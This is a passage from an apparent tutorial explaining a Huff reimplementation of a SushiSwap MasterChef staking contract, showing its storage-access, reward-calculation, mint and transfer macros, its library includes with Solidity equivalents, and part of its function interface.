</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>swap3 swap1 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEV</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller eq </span><span>only_dev_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#62a35c>__ERROR</span><span>(Unauthorized) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    only_dev_jump:
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SUSHI</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEVADDR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>BONUS_END_BLOCK</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[BONUS_END_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SUSHI_PER_BLOCK</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] 0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MIGRATOR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[MIGRATOR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>POOL_INFO</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#0086b3>0x60 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x80 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>USER_INFO</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x40 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>TOTAL_ALLOC_POINT</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>START_BLOCK</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[START_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>PLAYER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>ONLY_OWNER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span> (</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span> (</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[OWNER] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller eq </span><span>ONLY_OWNER_continue </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#62a35c>__ERROR</span><span>(Unauthorized) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    ONLY_OWNER_continue:
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>INNER_GET_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>2</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>1</span><span>) { 
</span><span>    </span><span style=color:#0086b3>[BONUS_END_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup3 gt 
</span><span>    to_is_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop 
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>() 
</span><span>        </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] </span><span style=color:#62a35c>SAFE_MUL</span><span>() 
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump 
</span><span>    to_is_bigger_jump: 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup4 lt 
</span><span>    from_is_smaller_jump </span><span style=color:#a71d5d;font-weight:700>jumpi 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop 
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>() 
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump 
</span><span>    from_is_smaller_jump: 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 dup3 
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>() 
</span><span>    </span><span style=color:#0086b3>[BONUS_MULTIPLIER_CONSTANT] </span><span style=color:#62a35c>SAFE_MUL</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 swap1 
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>() 
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>() 
</span><span>    end_jump: 
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>ERC20_BALANCE_OF</span><span>(mem_ptr) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>2</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>1</span><span>) {
</span><span>    </span><span style=color:#62a35c>__RIGHTPAD</span><span>(</span><span style=color:#0086b3>0x70a08231</span><span>) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore 
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>add mstore 
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x24</span><span> &lt;mem_ptr> </span><span style=color:#0086b3>0x20 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap4 gas staticcall  
</span><span>    call_success_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(CallFailed) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    call_success_jump:                      
</span><span>    </span><span style=color:#a71d5d;font-weight:700>returndatasize
</span><span>    size_is_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(ReturnDataSizeIsZero) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    size_is_not_zero_jump:
</span><span>    &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SUSHI_MINT</span><span>(mem_ptr) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>3</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>__RIGHTPAD</span><span>(</span><span style=color:#0086b3>0x40c10f19</span><span>) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore 
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>add mstore
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>add mstore
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x44</span><span> &lt;mem_ptr> </span><span style=color:#0086b3>0x00 0x00 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap5 gas call 
</span><span>    call_success_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(CallFailed) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    call_success_jump:
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>INNER_UPDATE_POOL</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>1</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) { 
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number gt 
</span><span>    block_number_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop pop 
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump 
</span><span>    block_number_bigger_jump: 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup1 sload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address 
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 
</span><span>    lp_supply_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>number swap1 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>sstore 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop 
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump 
</span><span>    lp_supply_not_zero_jump: 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 number 
</span><span>    </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>() 
</span><span>    </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload 
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload 
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() 
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload swap1 
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>() 
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload dup1 
</span><span>    </span><span style=color:#0086b3>0x0a </span><span style=color:#a71d5d;font-weight:700>dup4 
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>() 
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload 
</span><span>    </span><span style=color:#62a35c>SUSHI_MINT</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 address 
</span><span>    </span><span style=color:#62a35c>SUSHI_MINT</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 swap2 swap1 
</span><span>    </span><span style=color:#0086b3>[E] 
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>()  
</span><span>    </span><span style=color:#62a35c>SAFE_DIV</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload 
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sstore  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>number  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sstore 
</span><span>    end_jump: 
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>CHECK_PID</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>1</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>gt
</span><span>    is_not_out_of_bounds_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(OutOfBounds) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    is_not_out_of_bounds_jump:
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>GET_POOL_SLOT</span><span>(mem_ptr) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>1</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>1</span><span>) {
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT]
</span><span>    &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>mul
</span><span>    </span><span style=color:#0086b3>0x20</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>sha3
</span><span>    </span><span style=color:#a71d5d;font-weight:700>add
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SAFE_SUSHI_TRANSFER</span><span>(mem_ptr) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>2</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload dup1 address
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(&lt;mem_ptr>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup5 gt
</span><span>    amount_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop swap2 swap1
</span><span>        </span><span style=color:#62a35c>SUSHI_TRANSFER</span><span>(&lt;mem_ptr>)
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>    amount_bigger_jump:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 swap2
</span><span>        </span><span style=color:#62a35c>SUSHI_TRANSFER</span><span>(&lt;mem_ptr>)
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop
</span><span>    end_jump:
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SUSHI_TRANSFER</span><span>(mem_ptr) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>3</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>__RIGHTPAD</span><span>(</span><span style=color:#0086b3>0xa9059cbb</span><span>) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>add mstore
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>add mstore
</span><span>    &lt;mem_ptr> </span><span style=color:#0086b3>0x44</span><span> &lt;mem_ptr> 
</span><span>    </span><span style=color:#0086b3>0x00 0x00 </span><span style=color:#a71d5d;font-weight:700>swap5 gas call
</span><span>    call_success_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(CallFailed) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    call_success_jump:
</span><span>}
</span></code></pre></div></div><h3 id=include-directives>Include Directives</h3><p>Huff uses <code>#include</code> directives to import external libraries, functioning like Solidity's <code>import</code> statements. The contract imports several libraries from <a href=https://github.com/huff-language/huffmate/tree/main>huffmate</a>, the Huff equivalent of OpenZeppelin's Solidity libraries.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : include derectives</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/auth/Owned.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/utils/SafeTransferLib.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/math/SafeMath.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/auth/NonPayable.huff</span><span>"
</span><span style=color:#a71d5d;font-weight:700>#include</span><span> "</span><span style=color:#183691>../lib/huffmate/src/data-structures/Hashmap.huff</span><span>"
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent : import</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin/contracts/access/Ownable.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin/contracts/token/ERC20/SafeERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin/contracts/math/SafeMath.sol"</span><span>;
</span></code></pre></div></div><h3 id=interface-definitions>Interface Definitions</h3><p>Huff uses <code>#define</code> directives to declare functions, events, errors, and constants. Function and event definitions enable the compiler to generate the contract ABI and provide the <code>__FUNC_SIG</code> and <code>__EVENT_HASH</code> builtins for generating selectors at compile time. Error definitions declare custom revert reasons, and constants define compile-time values.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : ABI Interface</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>poolLength</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>add</span><span>(uint</span><span style=color:#0086b3>256</span><span> allocPoint, address lpToken, bool withUpdate) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>set</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> allocPoint, bool withUpdate) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>setMigrator</span><span>(address migrator) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>migrate</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>getMultiplier</span><span>(uint</span><span style=color:#0086b3>256</span><span> from, uint</span><span style=color:#0086b3>256</span><span> to) view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>pendingSushi</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, address user) view </span><span style=color:#62a35c>returns</span><span> (uint256)
